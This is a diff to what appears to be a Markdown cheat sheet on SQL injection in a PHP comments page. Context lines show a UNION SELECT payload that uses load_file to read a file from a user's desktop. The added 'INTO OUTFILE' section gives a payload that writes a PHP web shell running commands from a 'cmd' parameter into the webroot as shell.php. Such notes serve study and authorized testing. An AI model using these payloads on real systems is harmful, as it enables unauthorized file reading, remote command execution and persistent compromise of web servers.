@@ -24,6 +24,12 @@ Once we determine the column count and injectable parameter, we may be able to r
 https://127.0.0.1/comments.php?id=1337 union all select 1,2,3,4,load_file("C:\users\username\Desktop\user.txt"),6,7
 ```
 Becareful about how you use single and double quotes. We must know where the file resides on the file system before attmpting to read it. This also assumes that we can inject nested SQL statements on column `5`.
+## INTO OUTFILE
+We may also be able to write to a file using the SQL statement `INTO OUTFILE` like so,
+```
+https://127.0.0.1/comments.php?id=1337 union all select 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE 'C:\htdocs\webroot\shell.php',7
+```
+This assumes that we have nested injection working on the 5th and 6th columns of the table. This will create the PHP shell file if all goes well.
 ## GROUP CONCAT
 Group concatenation of records can be achieved using the `GROUP_CONCAT` stored procedure in MySQL,
 ```
